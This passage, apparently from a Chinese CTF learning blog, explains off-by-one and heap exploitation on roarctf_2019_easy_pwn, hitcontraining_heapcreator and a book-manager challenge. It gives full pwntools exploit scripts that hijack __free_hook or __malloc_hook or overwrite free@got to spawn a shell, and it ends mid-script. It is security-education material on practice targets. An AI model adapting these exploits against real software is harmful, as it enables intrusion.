<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc = load(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,25219)</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1297</span>,<span class="number">0x128B</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name_size,name,description_size,description</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">str</span>(description_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>,description)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,description</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter new book description: &quot;</span>,description)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">description</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>,description)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0x21000</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">book1_struct_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#-0x21e81a0</span></span><br><span class="line">log_addr(<span class="string">&quot;book1_struct_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(book1_struct_addr+<span class="number">0x60</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">change_name(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x5ca010</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;free_hook&quot;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base+one_gadget[<span class="number">1</span>]</span><br><span class="line">payload = p64(free_hook)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><em>roarctf_2019_easy_pwn</em></p>
<p><em>npuctf_2020_easyheap</em></p>
<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li>当不能改写_got_表时，可以覆盖<code>__free_hook</code>里的数据为后门地址。</li>
<li>泄漏_libc_的一种方法：如果要申请一个较大的_chunk_，_mmap_内存后，这个_chunk_的地址是一个_libc_地址。</li>
</ol>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>off-by-one学习笔记</title>
    <url>/2024/10/13/off-by-one%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a><em>roarctf_2019_easy_pwn</em></h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//v4 = sub_E26(*(&amp;unk_202044 + 4 * v3), v2);</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_E26</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;                          <span class="comment">//a1是add_size,a2是edit_size</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )   <span class="comment">//如果edit_size-add_size = 10，则v4=add_size+1</span></span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//v2 = sub_D92(qword_202048[2 * v3], v4);</span></span><br></pre></td></tr></table></figure>

<p>可以分析出，如果<code>edit_size-add_size = 10</code>，那么我们便可以写入，<code>add_size+1</code>字节的数据，造成_off-by-one_漏洞。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="泄漏-libc"><a href="#泄漏-libc" class="headerlink" title="泄漏_libc_"></a>泄漏_libc_</h4><h5 id="修改-chunk1-size"><a href="#修改-chunk1-size" class="headerlink" title="修改_chunk1_size_"></a>修改_chunk1_size_</h5><p>先创建<code>4</code>个_chunk_</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038931.png" alt="2" style="zoom:80%;" />

<p>往_chunk0_中写数据，通过_off-by-one_篡改_chunk1_的_size_字段为<code>0xa1</code>，使得_chunk_hook1_与_chunk_hook2_指向的空间，部分重叠。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xa1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038220.png" alt="1"></p>
<h5 id="写入-fake-chunk2-size"><a href="#写入-fake-chunk2-size" class="headerlink" title="写入_fake_chunk2_size_"></a>写入_fake_chunk2_size_</h5><p>现在，还需要解决一个问题：<br>_chunk1_的_size_被修改后，_real_chunk2_的部分空间与_chunk1_共享，所以现在会出现一个_fake_chunk2_以<code>0x559e6a0a70c0</code>这个地址作为首地址。又因为<code>0x559e6a0a70c8</code>处为<code>0</code>，故现在_fake_chunk2_的_size_为<code>0</code>，也因此，_chunk3_即使是正常的，也无法被划分空间。</p>
<p>我们现在需要在<code>0x559e6a0a70c8</code>处写上_fake_chunk2_的_size_，怎么写呢？不要忘了，_real_chunk2_并未改变，_chunk_hook2_也仍然是原来的_chunk_hook2_！<code>edit(2,size,content)</code>，就可以很正常的往<code>0x559e6a0a70c8</code>里写数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xe</span>+p64(<span class="number">0xa1</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#因为real_chunk2的size字段依然为0xa1,该部分不能改变</span></span><br><span class="line"><span class="comment">#((0x10+0x10)+(0x90+0x10))-0xa0 = 0x20</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,payload)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037952.png" alt="3" style="zoom:80%;" />

<h5 id="修改-chunk1-hook-size"><a href="#修改-chunk1-hook-size" class="headerlink" title="修改_chunk1_hook_size_"></a>修改_chunk1_hook_size_</h5><p>现在，还需要再解决一个问题：<br>本题中，能打印出多少字符，是由_chunk_hook_前面一个地址里的内容决定的。而现在，_chunk_hook1_前面的地址里，仍然是<code>0x0000001000000001</code>，也就是说当<code>show(1)</code>，我们依然只能打印出<code>0x10</code>个字符。怎么解决呢？</p>
<p>不要忘了，实际上的_chunk1_的_size_已经是<code>0xa0</code>了！所以我们<code>free</code>一次_chunk1_，再<code>malloc</code>一次<code>0x90</code>的内存，_chunk_hook_区域的_size_自然会变成<code>0x90</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line"><span class="comment">#由于我们对chunk1进行操作时会刷新real_chunk2的size,所以还要再从chunk1里改回去。fake_chunk2_size因为没有在chunk1的范围内，故不会被清除</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,payload)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037864.png" alt="4"></p>
<p>被刷新为<code>0</code>的_real_chunk2_size_：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037821.png" alt="5" style="zoom:67%;" />

<p>重新写入的_real_chunk2_size_：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037690.png" alt="6" style="zoom:67%;" />

<p>现在，我们终于可以，利用_chunk_hook1_与_chunk_hook2_这两个指针泄漏_libc_地址了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="one-gadget-获取-shell"><a href="#one-gadget-获取-shell" class="headerlink" title="one_gadget_获取_shell"></a><em>one_gadget_获取_shell</em></h4><h5 id="新设-real-chunk2-size"><a href="#新设-real-chunk2-size" class="headerlink" title="新设_real_chunk2_size_"></a>新设_real_chunk2_size_</h5><p>再次申请_real_chunk2_，此时_real_chunk2_的所有数据都已被清除。需重新设置_real_chunk2_的_size_为<code>0x71</code>（如此才能落入_fast bin_中），_fake_chunk2_的_size_为<code>0x21</code>，继续对其利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#real_chunk2_size = 0x71，fake_chunk2_size = 0x21</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,paylaod)</span><br></pre></td></tr></table></figure>

<h5 id="修改-fast-bin-中的-fd-bk"><a href="#修改-fast-bin-中的-fd-bk" class="headerlink" title="修改_fast bin_中的_fd,bk_"></a>修改_fast bin_中的_fd,bk_</h5><p>释放_real_chunk2_到_fast bin_中，然后通过往_chunk1_里写数据，修改_real_chunk2_的_fd_和_bk_，为我们在_malloc_hook_附近构造的_chunk_。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span>   <span class="comment">#找到以0x7f结尾的地址</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,payload)</span><br></pre></td></tr></table></figure>

<h5 id="劫持两个-hook"><a href="#劫持两个-hook" class="headerlink" title="劫持两个_hook_"></a>劫持两个_hook_</h5><p>从_fast bin_中回收_real_chunk2_，及构造的_fake_chunk_。然后覆盖<code>__realloc_hook</code>的值为<code>one_gadget</code>，<code>__malloc_hook</code>的值为<code>realloc+4</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#因为real_chunk2_size = 0x71</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">4</span>)</span><br><span class="line"><span class="comment">#__realloc_hook在__malloc_hook的上一个地址</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">11</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#程序会先执行realloc+4处的内容，然后再执行one_gadget</span></span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./a&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28833</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1253</span>,<span class="number">0x126B</span>,<span class="number">0x1277</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xa1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xe</span>+p64(<span class="number">0xa1</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;malloc_hook&quot;</span>)</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base+one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">11</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><em>hitcontraining_heapcreator</em></h2><h3 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="_off-by-one_利用思路"></a>_off-by-one_利用思路</h3><p>​	&#x3D;&#x3D;利用_off-by-one_，来改写下一个_chunk_的指针_chunk_的_size_，进而实现下一个_chunk_的指针_chunk_与内容_chunk_的部分重叠和互换。&#x3D;&#x3D;</p>
<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>​	一共有_create_heap_，_edit_heap_，_show_heap_，_delete_heap_四个函数，_edit_heap_函数中有一个堆溢出漏洞，只可以溢出<code>1</code>个字节。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png" alt="image-20240710181416024" style="zoom: 80%;" />

<p>​	本题中，每_malloc_一次会创建一个指针_chunk_和一个内容_chunk_（其实就是两个地址空间，分别存储着指向_chunk_中数据的指针，和_chunk_的数据），而_free_一次也就是把这两个地址空间都释放掉了。_show_heap_和_edit_heap_函数中打印和修改的内容都是由指针决定的，指针指向什么就打印和修改什么。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="改写-size"><a href="#改写-size" class="headerlink" title="改写_size_"></a>改写_size_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"><span class="comment">#往_chunk0_中写入&#x27;/bin/sh\x00&#x27;，后面free(chunk0)的时候其实就是system(&quot;/bin/sh&quot;)</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>

<p>​	先创建两个_chunk_，<code>0x18</code>是为了在往_chunk0_中写内容时，直接覆盖掉_chunk1_的指针_chunk_的前<code>8</code>个字节，然后就可以利用溢出的一个字节改写_chunk1_的指针_chunk_的_size_。</p>
<p>如图，指针_chunk_的_size_值已经被改写成<code>0x41</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png" alt="image-20240710192301972"></p>
<p>​	此时，_chunk1_的指针_chunk_与内容_chunk_，已经部分重叠（因为是指针_chunk_的_size_被改写成<code>0x41</code>，内容_chunk_的_size_还是<code>0x21</code>，所以如图</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png" alt="image-20240710192301977" style="zoom:80%;" />

<h4 id="泄漏-free-addr"><a href="#泄漏-free-addr" class="headerlink" title="泄漏_free_addr_"></a>泄漏_free_addr_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line"><span class="comment">#指针前面0x30是能存储数据的大小，不能改变</span></span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><code>delete(1)</code>后我们可以看到_fastbins_有两个不同大小的_fastbin_chunk_，如图</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png" alt="image-20240710212229702"></p>
<p>​	然后我们再申请<code>0x30</code>的_chunk_用来存储数据（还有<code>0x10</code>的空间存储_prve_size_和_size_），又因为_fastbins_中正好有<code>0x40</code>的_fastbins_chunk_，所以<code>0x12c2040</code>及下面<code>0x40</code>的内存空间就成了新_chunk_的内存_chunk_，<code>0x12c2060</code>及下面<code>0x20</code>的内存空间就成了新_chunk_的指针内存。</p>
<p>​	然后我们把_free@got_写到内存_chunk_的<code>0x12c2078</code>地址里，这个地址存储着指针_chunk_里的指针，所以现在指针就是_free@got_，而_show_函数打印出来的数据是该指针指向的内容，也就是_free@got_指向的内容。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png" alt="image-20240710215550221"></p>
<h4 id="覆盖-free-got-表"><a href="#覆盖-free-got-表" class="headerlink" title="覆盖_free@got_表"></a>覆盖_free@got_表</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​	同样，_edit_函数修改_chunk_内容，也是修改指针_chunk_的指针指向的区域。得到_system_的地址后，直接用_edit_函数修改_chunk1_的内容即可。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png" alt="image-20240710220849174"></p>
<p>最后直接_free_掉_chunk0_，便能执行<code>system(&quot;/bin/sh&quot;)</code>，得到_shell_。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28974</span>)</span><br><span class="line">debug(p,<span class="number">0x400DC4</span>,<span class="number">0x400DB8</span>,<span class="number">0x400DD0</span>,<span class="number">0x400DDC</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span 